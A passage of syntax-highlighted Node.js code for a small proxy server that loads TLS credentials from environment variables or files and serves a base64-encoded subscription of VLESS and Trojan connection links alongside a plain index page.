&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;ISP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Unknown&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GetISP&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; normalizeSecret&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;value&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!value&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; value.includes&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ? value.replace&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;n/g, &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; : value&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; readOptionalFile&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;filePath&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!filePath&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;resolvedPath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; path.isAbsolute&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;filePath&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ? filePath : path.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;__dirname, filePath&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; fs.readFileSync&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;resolvedPath, &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; catch &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;error&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    console.warn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;Failed to &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; TLS file &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;resolvedPath&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;: &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.message&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; getTLSOptions&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; normalizeSecret&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;process.env.TLS_KEY&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;cert&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; normalizeSecret&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;process.env.TLS_CERT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!key&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; readOptionalFile&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TLS_KEY_PATH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!cert&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;cert&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; readOptionalFile&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TLS_CERT_PATH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;key &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cert&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; key, cert &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;key &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; cert&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    console.warn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Both TLS key and certificate are required; falling back to HTTP.&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; null&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;requestHandler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;req, res&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;req.url &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;filePath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; path.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;__dirname, &lt;span class=&#34;s1&#34;&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    fs.readFile&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;filePath, &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;err, content&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;err&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        res.writeHead&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;200, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        res.end&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      res.writeHead&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;200, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      res.end&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;req.url &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;/&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;SUB_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;namePart&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; NAME ? &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;NAME&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;-&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ISP&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; : ISP&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;vlessURL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;vless://&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;@&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;?encryption&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;none&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tls&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sni&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;:443&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;chrome&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ws&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%2F&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;WSPATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#${namePart}`;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;trojanURL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;trojan://&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;@&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;?security&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tls&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sni&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;chrome&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ws&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;:443&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%2F&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;WSPATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#${namePart}`;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;subscription&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; vlessURL + &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; + trojanURL&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;base64Content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Buffer.from&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;subscription&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    res.writeHead&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;200, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    res.end&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;base64Content + &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    res.writeHead&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;404, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    res.end&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Not Found\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
